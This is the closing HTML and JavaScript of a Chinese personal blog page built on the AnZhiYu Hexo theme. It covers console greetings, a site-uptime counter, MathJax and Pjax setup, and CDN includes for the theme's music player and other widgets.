  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 渊 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("04/01/2021 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-下班啦.svg";
        img.title = "下班了就该开开心心的玩耍，嘿嘿~";
        img.alt = "下班了就该开开心心的玩耍，嘿嘿~";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.cbd.int/mathjax@3.2.2/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>